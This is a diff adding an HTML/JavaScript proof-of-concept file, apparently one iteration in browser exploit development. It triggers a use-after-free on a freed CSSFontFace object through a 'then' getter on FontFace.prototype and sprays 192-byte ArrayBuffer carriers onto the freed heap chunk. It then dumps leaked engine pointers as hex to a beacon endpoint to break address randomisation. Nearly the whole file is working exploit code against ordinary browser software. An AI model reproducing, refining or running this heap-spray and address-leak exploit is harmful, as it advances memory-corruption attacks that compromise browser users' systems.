@@ -1,0 +1,107 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>V912 — AB(192) carrier on the p640 trigger: landing test + absolute-address leak</title></head>
+<body><pre id="out"></pre><script>
+'use strict';
+/* v912: p640's trigger verbatim, with the getter spray swapped to
+   zeroed Uint8Array(192) carriers. If an AB(192) backing store lands on the
+   freed CSSFontFace chunk on 14.22, the engine's post-free writes become
+   READABLE BYTES: +0x00 refcount, +0x58/+0x68 engine pointers (per the 14.10
+   rows, absolute WebProcess-heap addresses). Any non-zero byte in any
+   carrier is a landing. Rescans at 0/100/400/1000/2000ms — every pass
+   examines every buffer (the p563 done-flag bug is not repeated). */
+(function () {
+    var out = document.createElement('pre'); document.body.appendChild(out);
+    function B(t, d) {
+        try {
+            var x = new XMLHttpRequest();
+            var u = '/beacon/V912-' + t + '?t=' + Date.now()
+                + (d !== undefined ? '&d=' + encodeURIComponent(String(d).slice(0, 700)) : '');
+            x.open('GET', u, false); x.send();
+        } catch (e) {}
+        out.textContent += '\n' + t + ' ' + (d === undefined ? '' : d);
+    }
+    function hex(v, from, len) {
+        var s = '';
+        for (var j = from; j < len; j++) s += ('0' + v[j].toString(16)).slice(-2);
+        return s;
+    }
+
+    var fs = document.createElement('style'); fs.id = 'fs';
+    fs.textContent = '@font-face { font-family: s2; src: local(Arial); unicode-range: U+0043; }';
+    document.head.appendChild(fs);
+    var ds = document.createElement('style'); ds.id = 'ds'; ds.textContent = 'body { margin: 0; }';
+    document.head.appendChild(ds);
+
+    var target = null, fired = false, lane = [];
+
+    /* pre-churn identical to p640 (fill=80): 80 warmup faces + 40 warmup strings */
+    function churn(n) {
+        for (var i = 0; i < n; i++) {
+            try { document.fonts.add(new FontFace('wf' + i, "local('ZZZZZ_WF_" + i + "')")); } catch (e) {}
+        }
+        var c = []; for (var j = 0; j < 156; j++) c[j] = 0;
+        for (var k = 0; k < 40; k++) { try { var s = String.fromCharCode.apply(null, c); } catch (e) {} }
+    }
+
+    function scanPass(tag) {
+        var hits = [];
+        for (var i = 0; i < lane.length; i++) {
+            var v = lane[i], nz = -1;
+            for (var j = 0; j < 192; j++) { if (v[j] !== 0) { nz = j; break; } }
+            if (nz >= 0) {
+                hits.push(i + '@' + nz);
+                /* full dump, chunked: bytes 0-95 and 96-191 */
+                B('DUMP' + tag + '-' + i, 'a:' + hex(v, 0, 96));
+                B('DUMP' + tag + '-' + i, 'b:' + hex(v, 96, 192));
+            }
+        }
+        return hits;
+    }
+
+    var all = [];
+    try { document.fonts.forEach(function (f) { all.push(f); }); } catch (e) {}
+    for (var i2 = 0; i2 < all.length; i2++) {
+        try { if (all[i2].family === 's2') { target = all[i2]; break; } } catch (e) {}
+    }
+    if (!target) { B('NOFACE'); return; }
+
+    churn(80);
+    void target.loaded;
+    B('READY', 'st=' + String(target.status));
+
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get: function () {
+            if (fired) return undefined;
+            fired = true;
+            B('THEN', 'same=' + (this === target) + '&st=' + String(this.status));
+            try { ds.textContent = 'body { margin: 1px; }'; } catch (e) {}
+            try { document.body.offsetHeight; } catch (e) {}
+            /* AB(192) carriers instead of CSSFontFace carriers */
+            for (var k = 0; k < 160; k++) lane.push(new Uint8Array(new ArrayBuffer(192)));
+            B('SPRAYED', String(lane.length));
+            return undefined;
+        },
+        set: function () {}
+    });
+    B('LOAD-CALLED');
+    target.load().then(
+        function () { B('AFTERLOAD', 'ok'); },
+        function (e) { B('AFTERLOAD', 'err:' + e && e.name); }
+    );
+
+    var delays = [0, 100, 400, 1000, 2000], pending = delays.length, foundAny = 0;
+    function pass(tag) {
+        var hits = scanPass(tag);
+        foundAny += hits.length;
+        if (hits.length) B('HIT' + tag, hits.slice(0, 12).join(','));
+        pending--;
+        if (!pending) {
+            B('SUMMARY', 'nonzero-buffers=' + foundAny + ' of ' + lane.length);
+            if (!foundAny) B('VERDICT', 'all-clean (AB-192 does not land, or the chunk is zeroed and nothing wrote)');
+            else B('VERDICT', '*** AB-192 CARRIER LANDS ON 14.22 — absolute addresses in the dumps ***');
+        }
+    }
+    for (var d = 0; d < delays.length; d++) { (function (t) { setTimeout(function () { pass(t); }, t); })(d); }
+    B('BOOT', 'v912 armed');
+})();
+</script></body></html>
